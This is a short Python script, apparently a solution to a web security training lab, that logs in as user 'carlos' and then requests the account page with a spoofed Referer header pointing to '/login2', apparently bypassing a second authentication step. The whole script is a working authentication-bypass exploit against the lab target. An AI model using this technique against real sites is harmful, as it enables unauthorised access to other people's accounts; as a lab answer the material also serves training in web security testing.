import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
burp_headers = {}
burp_data = {"username": "carlos", "password": "montoya"}

session = requests.Session()
session.post(login_url, headers=burp_headers, data=burp_data)

my_account_url = burp_url + "/my-account"
ref = burp_url + '/login2'
burp_headers = {"Referer": ref}
my_account_response = session.get(my_account_url,headers=burp_headers)

#print(my_account_response.text)
